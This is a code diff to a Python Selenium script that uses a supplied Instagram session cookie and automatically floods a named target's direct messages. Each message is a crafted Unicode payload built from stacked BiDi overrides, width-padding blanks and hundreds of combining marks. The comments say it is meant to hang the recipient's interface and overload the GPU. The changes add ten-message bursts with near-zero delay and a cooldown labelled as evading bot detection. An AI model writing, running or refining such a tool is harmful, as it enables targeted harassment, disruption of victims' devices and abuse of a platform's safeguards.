@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (CLICK-KILLER V20)
-# 📅 STATUS: EVENT-LOOP HIJACK | x20 DENSITY | GHOST INJECTION
+# 🚀 PROJECT: PRAVEER NC (OBLIVION V2 - DEVEL KA ABBU)
+# 📅 STATUS: DENSITY x20 | BiDi-RECURSION | 10-BURST WAVE
 
 import os, time, random, threading, sys, gc, tempfile
 from concurrent.futures import ThreadPoolExecutor
@@ -10,31 +10,31 @@ from selenium.webdriver.chrome.options import Options
 
 # --- MATRIX CONFIG ---
 THREADS = 2
-SESSION_LIMIT = 300 
+SESSION_LIMIT = 240 
 MACHINE_ID = os.getenv("MACHINE_ID", "1")
 
-def get_click_killer_payload(target_name):
-    """The Click-Killer: Disables UI interaction via Isolate Nesting."""
-    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 UI_INTERACTION_BLOCKED: {target_name.upper()}\n"
+def get_oblivion_payload(target_name):
+    """The Oblivion Payload: Density x20 + BiDi Recursion."""
+    # 🌙 CUSTOM HEADER
+    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n👑 SYSTEM_OBLIVION: [{target_name.upper()}]\n"
     
-    # 💥 THE 'ISOLATE TRAP' (Recursive Nesting)
-    # This forces the browser to traverse 150 layers for every mouse-click event.
-    isolate_trap = "\u2066\u2067\u2068" * 150 
+    # 💥 THE 'DIRECTIONAL STACK' (15 layers of nested text direction)
+    bidi_recursion = "\u202E\u2066\u202D\u2067\u202B\u2068" * 15
     
-    # 💥 THE 'WIDTH-BOMB' (Horizontal Displacement)
-    width_bomb = "\u2800\u00A0" * 150 
+    # 💥 THE 'WIDTH-DISPLACER' (Braille Blanks + Non-Breaking Spaces)
+    width_bomb = "\u2800\u00A0" * 125 
     
-    # 💥 DENSITY x20 (200 marks per character)
-    # Total GPU saturation.
+    # 💥 DENSITY x20 (200 Zalgo marks per character)
+    # This forces the GPU Command Buffer to overflow instantly.
     z_tower = "̸" * 200
     
-    lines = [header, isolate_trap]
+    lines = [header, width_bomb, bidi_recursion]
     
     for i in range(75):
-        # We alternate 'First Strong Isolate' markers to break the button's event listener
-        prefix = "\u2068\u202E" if i % 2 == 0 else "\u2069\u202D"
-        lines.append(f"{width_bomb}{prefix}{target_name.upper()}_LOCKED{z_tower}")
-        
+        prefix = "\u202E" if i % 2 == 0 else "\u202D"
+        # Forces Horizontal Overflow, Vertical Skyscraper, and BiDi Logic Hang
+        lines.append(f"{width_bomb}{prefix}{target_name.upper()}{z_tower}{bidi_recursion}")
+    
     return "\n".join(lines)[:9990]
 
 def get_driver(agent_id):
@@ -51,7 +51,7 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
     while True:
         driver = None
         try:
-            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ CLICK-KILLER V20 DEPLOYED...", flush=True)
+            print(f"[M{MACHINE_ID}-A{agent_id}] 🌙 DEVEL KA ABBU DEPLOYED...", flush=True)
             driver = get_driver(agent_id)
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
@@ -63,29 +63,27 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
             session_start = time.time()
             while (time.time() - session_start) < SESSION_LIMIT:
                 try:
-                    payload = get_click_killer_payload(target_name)
-                    
-                    # 🔥 THE GHOST INJECTION (Bypasses UI Lag)
-                    driver.execute_script("""
-                        var box = document.querySelector('div[role="textbox"]') || document.querySelector('textarea');
-                        if (box) {
-                            // Direct State Injection
-                            box.focus();
-                            document.execCommand('insertText', false, arguments[0]);
-                            box.dispatchEvent(new Event('input', { bubbles: true }));
-                            
-                            // Native Click Dispatch to bypass the target's UI lag
-                            var btns = document.querySelectorAll('div[role="button"]');
-                            for(var b of btns) {
-                                if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
-                                    b.dispatchEvent(new MouseEvent('click', {view: window, bubbles: true, cancelable: true}));
+                    # 🔥 THE 10-BURST WAVE
+                    for _ in range(10):
+                        payload = get_oblivion_payload(target_name)
+                        driver.execute_script("""
+                            var box = document.querySelector('div[role="textbox"]') || document.querySelector('textarea');
+                            if (box) {
+                                box.focus();
+                                document.execCommand('insertText', false, arguments[0]);
+                                box.dispatchEvent(new Event('input', { bubbles: true }));
+                                var btns = document.querySelectorAll('div[role="button"]');
+                                for(var b of btns) {
+                                    if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
+                                        b.click();
+                                    }
                                 }
                             }
-                        }
-                    """, payload)
+                        """, payload)
+                        time.sleep(0.01) # Near-zero delay for the burst
                     
-                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 UI_LOCKED", flush=True)
-                    time.sleep(random.uniform(0.1, 0.3)) 
+                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 10-BURST IMPACT DELIVERED", flush=True)
+                    time.sleep(random.uniform(6, 10)) # Cooldown to prevent bot detection
                     
                 except:
                     time.sleep(5)
